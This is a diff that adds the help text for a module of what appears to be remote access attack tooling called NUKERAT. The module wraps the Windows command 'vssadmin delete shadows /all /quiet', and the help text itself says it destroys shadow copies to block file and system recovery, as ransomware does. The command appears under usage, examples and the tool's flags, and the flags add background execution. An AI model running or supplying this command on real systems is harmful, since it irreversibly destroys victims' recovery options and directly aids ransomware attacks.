@@ -1,0 +1,17 @@
+ABOUT
+    Volume Shadow Copy Service administrative command-line tool.
+    LOLBAS documents destroy shadow copies to prevent file and
+    system recovery, a technique commonly used by ransomware.
+
+USAGE:
+    vssadmin delete shadows /all /quiet
+
+EXAMPLES:
+    vssadmin delete shadows /all /quiet
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    vssadmin delete shadows /all /quiet
